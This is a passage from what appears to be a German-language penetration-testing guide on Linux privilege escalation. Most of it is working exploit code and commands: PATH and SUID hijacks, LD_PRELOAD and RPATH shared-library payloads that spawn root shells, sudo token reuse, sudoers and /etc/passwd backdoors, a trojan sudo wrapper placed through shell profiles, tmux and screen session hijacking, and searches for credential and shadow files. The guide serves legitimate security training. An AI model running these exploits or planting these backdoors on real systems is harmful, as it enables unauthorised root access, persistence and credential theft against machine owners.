Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** erteilt wird: _hacker10 ALL= (root) less_ kannst du sie ausnutzen, indem du die PATH-Variable änderst
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn eine **suid**-Binary einen anderen Befehl **ausführt, ohne den Pfad dazu anzugeben (immer mit** _**strings**_ **den Inhalt einer seltsamen SUID-Binary prüfen)**.

[Payload-Beispiele zum Ausführen.](payloads-to-execute.md)

### SUID binary mit Befehls-Pfad

Wenn die **suid**-Binary einen anderen Befehl **ausführt und dabei den Pfad angibt**, dann kannst du versuchen, eine Funktion zu **exportieren**, die nach dem Namen des Befehls benannt ist, den die suid-Datei aufruft.

Wenn zum Beispiel eine suid-Binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann wird, wenn du das SUID-Binary aufrufst, diese Funktion ausgeführt

### Writable script executed by a SUID wrapper

Eine häufige Custom-App-Fehlkonfiguration ist ein root-owned SUID-Binary-Wrapper, der ein Skript ausführt, während das Skript selbst von low-priv users beschreibbar ist.

Typisches Muster:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Wenn `/usr/local/bin/backup.sh` schreibbar ist, kannst du Payload-Befehle anhängen und dann den SUID-Wrapper ausführen:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Schnelle Checks:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Dieser Angriffspfad ist besonders häufig in „maintenance“/„backup“-Wrappers, die in `/usr/local/bin` ausgeliefert werden.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Prozess ist als Preloading einer Library bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Executables, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die reale User-ID (_ruid_) nicht mit der effektiven User-ID (_euid_) übereinstimmt.
- Für Executables mit suid/sgid werden nur Libraries in Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Privilege escalation kann auftreten, wenn du Befehle mit `sudo` ausführen kannst und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und erkannt wird, auch wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung beliebigen Codes mit erhöhten Privilegien führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Save as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **Privilegien eskalieren**, indem man ausführt
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnliches Privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH**-Umgebungsvariable kontrolliert, weil er den Pfad kontrolliert, in dem nach Libraries gesucht wird.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Berechtigungen stößt, das ungewöhnlich erscheint, ist es eine gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Das kann mit dem folgenden Befehl überprüft werden:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein mögliches Exploitation-Potenzial hin.

Um dies auszunutzen, würde man fortfahren, indem man eine C-Datei erstellt, etwa _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt nach der Kompilierung und Ausführung darauf ab, Privilegien zu erhöhen, indem Dateiberechtigungen manipuliert und eine Shell mit erhöhten Privilegien ausgeführt werden.

Kompiliere die obige C-Datei zu einer Shared Object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID-Binaries den Exploit auslösen und möglicherweise zu einer Kompromittierung des Systems führen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Jetzt, da wir ein SUID-Binary gefunden haben, das eine Library aus einem Ordner lädt, in den wir schreiben können, erstellen wir die Library in diesem Ordner mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn du einen Fehler wie den folgenden erhältst:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen man in einem Befehl **nur Argumente injizieren** kann.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder beizubehalten, Dateien zu übertragen, Bind- und Reverse-Shells zu starten und die anderen Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine beliebige sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo-Zugriff** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf eine sudo-Befehlsausführung wartest und dann das Sitzungstoken hijackst**.

Anforderungen zum Eskalieren von Privilegien:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten** `sudo` **verwendet**, um etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, das uns erlaubt, `sudo` ohne Passwort zu verwenden)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist verfügbar (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien mit Folgendem eskalieren:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt das Binary `activate_sudo_token` in _/tmp_. Du kannst es verwenden, um **das sudo-Token in deiner Session zu aktivieren** (du bekommst nicht automatisch eine Root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_ **im Besitz von root mit setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte Exploit** (`exploit_v3.sh`) wird **eine sudoers-Datei erstellen**, die **sudo-Tokens unendlich macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie **Schreibrechte** im Ordner oder auf einer der dort erstellten Dateien haben, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo token für einen Benutzer und eine PID zu erstellen**.\
Wenn Sie zum Beispiel die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo privileges erhalten**, ohne das Passwort zu kennen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` nutzen kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **interessante Informationen** erhalten, und wenn du **eine** Datei **schreiben** kannst, wirst du in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binary wie `doas` für OpenBSD. Denk daran, seine Konfiguration unter `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass sich ein **Benutzer normalerweise mit einer Maschine verbindet und `sudo` verwendet**, um Privilegien zu eskalieren, und du eine Shell im Kontext dieses Benutzers erhalten hast, kannst du **ein neues sudo-Executable erstellen**, das deinen Code als root und danach den Befehl des Benutzers ausführt. Dann **ändere den $PATH** des Benutzerkontexts (zum Beispiel durch Hinzufügen des neuen Pfads in .bash_profile), sodass, wenn der Benutzer `sudo` ausführt, dein sudo-Executable ausgeführt wird.

Beachte, dass du, wenn der Benutzer eine andere Shell verwendet (nicht bash), andere Dateien ändern musst, um den neuen Pfad hinzuzufügen. Zum Beispiel modifiziert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder etwas in der Art ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die Datei `/etc/ld.so.conf` zeigt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen **Libraries** **gesucht** werden. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Libraries in `/usr/local/lib` suchen wird**.

Wenn ein Benutzer aus irgendeinem Grund **Schreibrechte** auf einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, auf irgendeine Datei innerhalb von `/etc/ld.so.conf.d/` oder auf einen beliebigen Ordner innerhalb der Konfigurationsdatei in `/etc/ld.so.conf.d/*.conf`, kann er möglicherweise Privilegien eskalieren.\
Sieh dir an, **wie diese Fehlkonfiguration ausgenutzt werden kann** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{#endref}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der lib nach `/var/tmp/flag15/` wird sie von dem Programm an diesem Ort verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Dann erstelle eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities bieten eine **Teilmenge der verfügbaren root-Privilegien für einen Prozess**. Dadurch werden root-**Privilegien effektiv in kleinere und unterschiedliche Einheiten aufgeteilt**. Jede dieser Einheiten kann dann einzeln an Prozesse vergeben werden. Auf diese Weise wird der vollständige Satz an Privilegien reduziert, was das Risiko einer Ausnutzung verringert.\
Lies die folgende Seite, um **mehr über capabilities zu erfahren und wie man sie missbraucht**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In einem Verzeichnis bedeutet das **"execute"**-Bit, dass der betroffene Benutzer in den Ordner **"cd"**en kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **files** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer neue **files** **löschen** und **erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene diskretionärer Berechtigungen dar und können die traditionellen ugo/rwx-Berechtigungen **außer Kraft setzen**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte erlauben oder verweigern. Diese Ebene der **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details findest du [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Holen** Sie Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteckte ACL-Backdoor auf sudoers-Drop-ins

Eine häufige Fehlkonfiguration ist eine von root besessene Datei in `/etc/sudoers.d/` mit Modus `440`, die einem Low-Priv-User dennoch Schreibzugriff über ACL gewährt.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Wenn du etwas wie `user:alice:rw-` siehst, kann der Benutzer trotz restriktiver Mode-Bits eine sudo-Regel anhängen:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dies ist ein ACL-Persistenz-/Privesc-Pfad mit hoher Auswirkung, da er bei Prüfungen, die sich nur auf `ls -l` stützen, leicht übersehen wird.

## Open shell sessions

In **alten Versionen** kannst du einige **shell**-Sessions eines anderen Benutzers (**root**) **hijacken**.\
In **neuesten Versionen** kannst du dich nur mit screen-Sessions **deines eigenen Benutzers** **connect**en. Allerdings könntest du **interessante Informationen innerhalb der Session** finden.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**An eine Session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem mit **alten tmux-Versionen**. Ich war nicht in der Lage, eine von root erstellte tmux (v2.1)-Session als nicht privilegierter Benutzer zu hijacken.

**tmux-Sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Bug entsteht beim Erstellen eines neuen ssh-Schlüssels auf diesen OS, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und du **mit dem öffentlichen ssh-Schlüssel den entsprechenden privaten Schlüssel suchen** kannst. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Legt fest, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Legt fest, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt dies fest, ob der Server Anmeldungen bei Konten mit leerem Passwortstring erlaubt. Der Standard ist `no`.

### Login control files

Diese Dateien beeinflussen, wer sich anmelden kann und wie:

- **`/etc/nologin`**: falls vorhanden, blockiert Nicht-Root-Logins und zeigt die enthaltene Meldung an.
- **`/etc/securetty`**: schränkt ein, wo sich root anmelden kann (TTY-Allowlist).
- **`/etc/motd`**: Banner nach dem Login (kann Umgebung oder Wartungsdetails leaken).

### PermitRootLogin

Legt fest, ob sich root per ssh anmelden kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich per Passwort und privatem Schlüssel anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: Root kann sich nur mit privatem Schlüssel anmelden und wenn die command-Optionen angegeben sind
- `no` : no

### AuthorizedKeysFile

Legt Dateien fest, die die öffentlichen Schlüssel enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers** angeben. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration wird anzeigen, dass, wenn du versuchst, dich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, ssh den öffentlichen Schlüssel deines Schlüssels mit denjenigen vergleicht, die sich in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` befinden

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **deine lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrasen!) auf deinem Server liegen zu lassen. So kannst du per ssh **zu einem Host springen** und von dort **zu einem anderen** Host **springen**, indem du den **Schlüssel** verwendest, der sich auf deinem **ursprünglichen Host** befindet.

Du musst diese Option in `$HOME/.ssh.config` so setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host auf die Keys zugreifen kann (was ein Sicherheitsproblem ist).

Die Datei `/etc/ssh_config` kann **diese** **optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da du es **möglicherweise missbrauchen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profiles files

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher kannst du, wenn du **eine von ihnen schreiben oder ändern kannst, Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein seltsames Profile-Skript gefunden wird, solltest du es auf **sensitive details** prüfen.

### Passwd/Shadow Files

Abhängig vom OS können die `/etc/passwd`- und `/etc/shadow`-Dateien einen anderen Namen haben oder es kann ein Backup existieren. Daher wird empfohlen, **alle davon zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen kannst du **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei) finden
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Zuerst generiere ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Dann füge den Benutzer `hacker` hinzu und füge das generierte Passwort hinzu.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z.B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den `su`-Befehl mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Du könntest die aktuelle Sicherheit der Maschine verschlechtern.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: In BSD-Plattformen befindet sich `/etc/passwd` in `/etc/pwd.db` und `/etc/master.passwd`, außerdem ist `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige sensible Dateien **schreiben kannst**. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und du die **Tomcat-Dienstkonfigurationsdatei in /etc/systemd/** ändern kannst, dann kannst du die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine Backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten nicht lesen können, aber versuche es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsamer Ort/Besessene Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien mit Passwörtern

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, mit der sich viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac auslesen lassen.

### Logs

Wenn du Logs lesen kannst, kannst du darin möglicherweise **interessante/vertrauliche Informationen finden**. Je seltsamer das Log ist, desto interessanter wird es vermutlich sein.\
Außerdem können einige "**schlecht**" konfigurierte (mit Backdoor versehene?) **Audit-Logs** es dir erlauben, **Passwörter** in Audit-Logs aufzuzeichnen, wie in diesem Beitrag erklärt wird: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen**, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generische Creds-Suche/Regex

